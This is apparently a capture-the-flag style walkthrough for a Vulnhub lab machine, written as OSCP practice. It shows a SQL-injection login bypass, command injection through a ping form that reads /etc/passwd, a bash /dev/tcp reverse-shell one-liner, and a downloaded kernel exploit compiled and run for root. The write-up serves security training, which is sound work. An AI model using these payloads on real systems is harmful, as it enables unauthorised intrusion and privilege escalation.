---
published: true
---
Vulnhub virtual machine; On the path to OSCP this box offered SQL-injection for login and a client side web application that was able to be manipulated to give a foothold to box. Classic enumeration of box to compile a priv-esc.


----------

Legal Usage:
*The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*


----------


# Enumeration

Find target on network

    netdiscover -r 192.168.56.104

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550535688380_image.png)


Target: 192.168.56.104

Nmap Scan

    nmap -sC -sV -oA nmap/kio2 192.168.56.104

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550535760771_image.png)


searchsploit search

    searchsploit 2.0.52

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550535863685_image.png)


*DoS is not useful in this scenario.*


Navigate to webpage

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550535971455_image.png)


Test for SQL injection
`username: admin' OR '1=1--`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550536679360_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550536701093_image.png)


*Successful injection! We are now face with some sort of client side PING tester.*


Testing a ping for localhost

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550536792128_image.png)


*Looks like we have successful command execution on box.*

# Remote Code Execution

Attempt to grab the passwd file by submitting:

    127.0.0.1; cat /etc/passwd

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550536981458_image.png)


Whoami

    127.0.0.1; whoami

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550537060293_image.png)


*we are ‘apache’.*

# Reverse Shell

Setup Listener on port 9000

    nc -lvnp 9000

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550537230094_image.png)


Attempt to setup a reverse connection with an easy one liner
`/bin/bash -i >& /dev/tcp/[ip_address]/[port] 0>&1`

how it works:
`*bash -i>&*`*: invoke bash with an interactive option*
`*/dev/tcp/[localhost]/9000*`*: redirect the session with the /dev/tcp device file*
`*0>&1*`*: use the standard output and redirect it to the standard input*


![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550537329497_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550537383681_image.png)


*connection established to box and we are ‘apache’.*

**Upgrade Half Shell to Full Shell**
Test for which python

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550537532715_image.png)

    python -c 'import pty; pty.spawn("/bin/bash")'
    press cntl+z 
    stty raw -echo
    fg (enter)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550538483696_image.png)


# Priv-Escalation
Investigate the environment

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550538055374_image.png)


*Running CentOS release 4.5 and Linux 2.6.9-55*

check searchsploit for vulnerabilties:

    searchsploit 2.6.x CentOS

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550538460322_image.png)


*Interesting hit with Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10)*

Mirror exploit to directory

    searchsploit -m exploits/linux/local/9545.c

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550538544092_image.png)


*Investigate/search for any random shell code and replace if needed.*

Get file over to target box with a SimpleHTTPServer

    python -m SimpleHTTPServer

Save file to memory of box as a good habit located at: `/dev/shm`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550538796540_image.png)



Compile on box:

    gcc -o exploit 9545.c

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550538968289_image.png)


Change the chmod of the file `chmod 755 exploit`

# Root
Execute exploit

    ./exploit

![](https://d2mxuefqeaa7sj.cloudfront.net/s_A66121450A4ACE7CA1EAFDAB4E2C0EBA58B17C1F73A27D4C0B94DF8F7C1BC768_1550539029550_image.png)


Bring me the root!

-exec
